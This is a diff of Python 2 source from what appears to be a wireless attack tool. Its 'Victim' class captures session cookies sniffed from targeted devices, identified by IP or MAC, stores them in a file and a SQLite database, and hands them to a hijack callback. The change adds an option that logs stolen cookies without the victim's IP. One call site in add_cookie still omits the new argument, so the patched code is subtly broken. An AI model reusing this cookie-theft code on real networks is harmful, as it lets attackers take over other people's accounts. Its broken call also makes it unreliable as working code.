@@ -8,7 +8,7 @@ from lib.packet_handler import *
 from lib.sniffer import *
 import sqlite3 as lite
 
-class Victim:
+class Victim(object):
 	'''Victim class is your target, define it by setting ip or mac address.
 	
 	It needs an instance of VictimParameters, where you set what you want to inject per victim.
@@ -94,7 +94,7 @@ class Victim:
 					return self.victim_parameters.file_inject
 
 
-	def check_add_cookie(self, cookie):
+	def check_add_cookie(self, cookie, args):
 		'''Checks if cookie has already been captured.'''
 		exists = 0
 		for existing_cookie in self.cookies:
@@ -105,10 +105,22 @@ class Victim:
 			print ""
 			print "[+] New cookie detected for ", self.mac
 			print cookie
-			self.cFile.write(self.ip + '\n' + self.mac + '\n' + cookie[0] + '\n' + cookie[1] + '\n\n')
-			with self.con:
-				self.db.execute("INSERT OR IGNORE INTO ip2mac VALUES(?, ?);", (self.ip, self.mac))
-				self.db.execute("INSERT OR IGNORE INTO cookies VALUES(?, ?, ?);", (self.ip, cookie[0], cookie[1]))
+			### Trace why no ip...
+			#print self.ip
+			#print self.mac
+			#print cookie[0]
+			#print cookie[1]
+			if not args.t:
+				self.cFile.write(self.ip + '\n' + self.mac + '\n' + cookie[0] + '\n' + cookie[1] + '\n\n')
+				with self.con:
+					self.db.execute("INSERT OR IGNORE INTO ip2mac VALUES(?, ?);", (self.ip, self.mac))
+					self.db.execute("INSERT OR IGNORE INTO cookies VALUES(?, ?, ?);", (self.ip, cookie[0], cookie[1]))
+			else:
+				blankVal = ''
+				self.cFile.write(self.mac + '\n' + cookie[0] + '\n' + cookie[1] + '\n\n')
+				with self.con:
+					self.db.execute("INSERT OR IGNORE INTO ip2mac VALUES(?, ?);", (blankVal, self.mac))
+					self.db.execute("INSERT OR IGNORE INTO cookies VALUES(?, ?, ?);", (blankVal, cookie[0], cookie[1]))
 			
 			if (self.victim_parameters.highjack is not None):
 				self.victim_parameters.highjack(cookie)
@@ -126,7 +138,7 @@ class Victim:
 					print bcolors.WARNING + "[!] No cookie on client", self.mac, " for website", cookie[0] + bcolors.ENDC
 
 
-	def add_cookie(self, cookie):
+	def add_cookie(self, cookie, args):
 		'''Cookie handling function, if --websites is set, ignores all cookies for hosts other than specified.'''
 		## Print cookie
 		if (self.victim_parameters.websites is not None):
@@ -134,4 +146,4 @@ class Victim:
 				if (cookie[0] in website):
 					self.check_add_cookie(cookie)
 		else:
-			self.check_add_cookie(cookie)
+			self.check_add_cookie(cookie, args)
